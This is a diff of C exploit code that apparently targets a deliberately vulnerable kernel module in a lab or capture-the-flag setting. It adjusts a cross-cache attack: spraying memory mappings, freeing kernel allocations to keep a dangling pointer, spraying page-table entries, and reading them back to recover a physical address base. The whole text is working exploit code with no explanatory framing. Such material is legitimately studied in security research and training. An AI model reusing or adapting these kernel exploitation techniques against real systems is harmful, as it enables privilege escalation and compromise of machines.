@@ -51,8 +51,10 @@ static void save_state() {
 }
 
 #define N_SPRAY 0x1000
-// size for direct cross cache attack
 #define VULN_SIZE 0x100
+#define PAGES (VULN_SIZE / 8)
+#define VULN_SPRAY (N_SPRAY / 0x10)
+#define OFF 9
 
 int main(int argc, char *argv[]) {
   void *keap_ptr;
@@ -68,30 +70,29 @@ int main(int argc, char *argv[]) {
   lstage("START");
 
   for (int i = 0; i < N_SPRAY; i++)
-    spray[i] = mmap((void *)(0xdead000000 + i * 0x10000), 0x8000,
+    spray[i] = mmap((void *)(0xdead000000 + i * 0x2000 * PAGES), 0x1000 * PAGES,
                     PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
 
   linfo("create dangeling ptr");
-  void *keap_ptrs[N_SPRAY] = {0};
-  for (int i = 0; i < N_SPRAY; i++) {
+  void *keap_ptrs[VULN_SPRAY] = {0};
+  for (int i = 0; i < VULN_SPRAY; i++) {
     keap_ptrs[i] = keap_malloc(VULN_SIZE, GFP_KERNEL_ACCOUNT);
   }
 
-  for (int i = 0; i < N_SPRAY; i++) {
+  for (int i = 0; i < VULN_SPRAY; i++) {
     keap_free(keap_ptrs[i]);
-    if (i == N_SPRAY / 2) {
+    if (i == VULN_SPRAY / 2 + OFF) {
       keap_ptr = keap_ptrs[i];
     }
   }
 
   linfo("spray PTEs");
   for (int i = 0; i < N_SPRAY; i++)
-    for (int j = 0; j < 8; j++)
-      *(u64 *)(spray[i] + j * 0x1000) = 0x6fe1be2;
+    *(u64 *)(spray[i]) = 0x6fe1be2;
 
 #ifdef DEBUG
   keap_read(keap_ptr, leak, VULN_SIZE);
-  print_hex(leak, 0x80);
+  print_hex(leak, VULN_SIZE);
 #endif
 
   keap_read(keap_ptr, &pte, 0x8);
@@ -106,15 +107,11 @@ int main(int argc, char *argv[]) {
   u64 *vuln = 0;
   u64 physbase = 0;
   for (int i = 0; i < N_SPRAY; i++) {
-    for (int j = 0; j < 8; j++) {
-      if (*(u64 *)(spray[i] + j * 0x1000) != 0x6fe1be2) {
-        vuln = (u64 *)(spray[i] + j * 0x1000);
-        physbase = (*vuln & ~0xfff);
-        break;
-      }
-    }
-    if (physbase)
+    if (*(u64 *)(spray[i]) != 0x6fe1be2) {
+      vuln = (u64 *)(spray[i]);
+      physbase = (*vuln & ~0xfff);
       break;
+    }
   }
 
   CHK(physbase);
